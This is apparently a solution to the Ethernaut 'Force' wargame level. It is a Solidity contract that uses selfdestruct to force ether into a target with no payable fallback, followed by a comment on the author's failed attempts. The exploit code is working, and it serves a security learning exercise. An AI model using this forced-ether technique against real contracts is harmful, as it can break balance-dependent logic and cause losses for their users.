pragma solidity ^0.6.0;

contract ForceReceive {

    receive() external payable {}

    function forceReceive(address payable _f) public {
        selfdestruct(_f);
    }
}

// I'll admit, this challenge had me stumped, and I had to look at the ethernaut repo to be nudged into getting the answer. I tried various 
// forms of `call` at first, but I found that the documentation was correct and that the transaction would revert because the fallback wasn't
// payable. I also tried funding as an EOA. I even thought maybe the challenge was a tricksy hobbit and that I needed to fund the deployment of
// the instance (that function _is_ payable, and _does_ pass along the value much like a `call` does) but the value went to the level deployer,
// not the deployed level. Sigh Anyway, interesting challenge.
